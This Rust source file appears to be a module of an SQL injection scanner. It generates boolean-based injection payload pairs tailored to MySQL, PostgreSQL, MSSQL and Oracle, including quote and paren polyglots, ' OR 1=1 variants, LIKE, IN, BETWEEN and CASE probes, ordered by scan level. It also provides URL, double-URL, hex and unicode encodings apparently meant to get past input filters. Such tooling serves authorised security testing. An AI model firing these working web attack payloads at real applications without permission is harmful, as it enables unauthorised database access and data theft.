#![deny(unsafe_code)]

use std::fmt::Write as _;

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct BooleanPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub comment: String,
}

impl BooleanPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        comment: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            comment: comment.into(),
        }
    }
}

/// Generate boolean payloads adapted per DBMS.
///
/// Ordering is load-bearing for `--level` budgets (`payload_budget(level, 2, …)`):
/// L1 tries the first 2 (polyglot + historical `' OR 1=1`), L2 the first 4,
/// L3+ the whole list. The five historical payloads keep their relative order
/// right after the head polyglot so L1/L2 behaviour stays byte-identical when
/// the polyglot probe is inconclusive.
///
/// Every pair is TRUE/FALSE-coherent (same shape, minimal `1`↔`2` / `a`↔`b`
/// flip) so [`crate::techniques::tamper::tamper_transformation_sets`] can apply
/// the same transformation set to both branches without mismatching indices.
#[must_use]
pub fn boolean_payloads_for(dbms: Option<&str>) -> Vec<BooleanPayload> {
    #[allow(clippy::match_same_arms)]
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    vec![
        // P0-1 head polyglot (single-quote dominant): closes `'`, `"` and
        // `()))` in one probe. Double-quote variant sits at index 6 so L1
        // keeps `[poly, historical ' OR 1=1]` for backward compatibility.
        BooleanPayload::new(
            format!(r#"'"())) OR '1'='1'{comment}"#),
            format!(r#"'"())) OR '1'='2'{comment}"#),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 1=1{comment}"),
            format!("' OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' AND 1=1{comment}"),
            format!("' AND 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("\" OR 1=1{comment}"),
            format!("\" OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!(") OR 1=1{comment}"),
            format!(") OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'a'='a{comment}"),
            format!("' OR 'a'='b{comment}"),
            comment,
        ),
        // Double-quote dominant polyglot variant (mirror prefix).
        BooleanPayload::new(
            format!(r#""'())) OR "1"="1"{comment}"#),
            format!(r#""'())) OR "1"="2"{comment}"#),
            comment,
        ),
        // Numeric context: no leading quote (replaces `id=1` with `1 AND …`).
        BooleanPayload::new(
            format!("1 AND 1=1{comment}"),
            format!("1 AND 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("1 OR 1=1{comment}"),
            format!("1 OR 1=2{comment}"),
            comment,
        ),
        // Multi-paren closings.
        BooleanPayload::new(
            format!("')) OR 1=1{comment}"),
            format!("')) OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("\")) OR 1=1{comment}"),
            format!("\")) OR 1=2{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("))) OR 1=1{comment}"),
            format!("))) OR 1=2{comment}"),
            comment,
        ),
        // MySQL backtick identifier closing.
        BooleanPayload::new(
            format!("` OR 1=1{comment}"),
            format!("` OR 1=2{comment}"),
            comment,
        ),
        // Operator variants (same TRUE/FALSE coherence: `a`↔`b` flip).
        BooleanPayload::new(
            format!("' OR 'a' LIKE 'a'{comment}"),
            format!("' OR 'a' LIKE 'b'{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'a' IN ('a'){comment}"),
            format!("' OR 'a' IN ('b'){comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR 'b' BETWEEN 'a' AND 'c'{comment}"),
            format!("' OR 'z' BETWEEN 'a' AND 'c'{comment}"),
            comment,
        ),
        BooleanPayload::new(
            format!("' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1{comment}"),
            format!("' OR (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1{comment}"),
            comment,
        ),
    ]
}

/// Encodings: URL, double-URL, hex, unicode, whitespace variants, case mixing.
#[must_use]
pub fn encode_payload(payload: &str, encoding: &str) -> String {
    match encoding {
        "url" => url::form_urlencoded::byte_serialize(payload.as_bytes()).collect(),
        "double_url" => {
            let once: String = url::form_urlencoded::byte_serialize(payload.as_bytes()).collect();
            url::form_urlencoded::byte_serialize(once.as_bytes()).collect()
        }
        "hex" => payload.bytes().fold(String::new(), |mut acc, b| {
            let _ = write!(acc, "%{b:02x}");
            acc
        }),
        "unicode" => payload.chars().fold(String::new(), |mut acc, c| {
            let _ = write!(acc, "%u{:04x}", c as u32);
            acc
        }),
        _ => payload.to_owned(),
    }
}
